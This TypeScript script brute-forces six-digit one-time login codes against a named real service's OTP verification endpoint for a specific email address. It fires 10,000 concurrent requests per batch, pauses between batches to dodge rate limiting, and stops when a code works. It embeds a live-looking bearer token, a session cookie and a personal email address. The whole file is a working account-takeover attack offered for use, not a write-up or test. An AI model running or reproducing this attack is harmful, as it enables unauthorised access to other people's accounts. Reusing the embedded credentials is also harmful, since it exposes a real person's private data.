import axios from "axios";
import qs from "qs";
let ansOTP;
const sendOTP = async (otp: number): Promise<boolean> => {
  let data = qs.stringify({
    username: "aryan.s.nag@gmail.com",
    verification_code: otp.toString(),
    user_group: "6",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "https://capi.collegepond.com/mobapi/Login/verifiyLoginOtp",
    headers: {
      "User-Agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
      Accept: "application/json",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate, br, zstd",
      Authorization:
        "Bearer 01efcb903f250d11b49ca72dbd172b600b4c770a2ceab7ba62dbda889dc4176f",
      "Content-Type": "application/x-www-form-urlencoded",
      Origin: "https://app.collegepond.com",
      "Sec-GPC": "1",
      Connection: "keep-alive",
      Referer: "https://app.collegepond.com/",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-site",
      Cookie: "ci_session=8ob9m49m99kme51vmn8ntisfoqol8bii",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    console.log(`OTP ${otp}: ${JSON.stringify(response.data)}`);

    if (response.data && response.data.status === true) {
      console.log(`SUCCESS! Found working OTP: ${otp}`);
      ansOTP = otp;
      return true;
    }
    return false;
  } catch (error: any) {
    console.error(`Error with OTP ${otp}:`, error.message);
    return false;
  }
};

const main = async () => {
  // Much smaller batch size to prevent overwhelming the server
  const batchSize = 10000;
  const startOTP = 100000;
  const endOTP = 999999;

  for (let i = startOTP; i < endOTP; i += batchSize) {
    console.log(`Testing OTP range: ${i} to ${i + batchSize - 1}`);

    const promises = [];
    for (let j = 0; j < batchSize; j++) {
      if (i + j <= endOTP) {
        promises.push(sendOTP(i + j));
      }
    }

    const results = await Promise.all(promises);

    // If any OTP was successful, exit the loop
    if (results.includes(true)) {
      console.log("Found working OTP, exiting");
      console.log(`Found working OTP: ${ansOTP}`);
      break;
    }

    // Add a delay between batches to avoid rate limiting
    await new Promise((resolve) => setTimeout(resolve, 2000));
  }
};

main().catch((error) => {
  console.error("Main process error:", error);
});

// await sendOTP(318659);
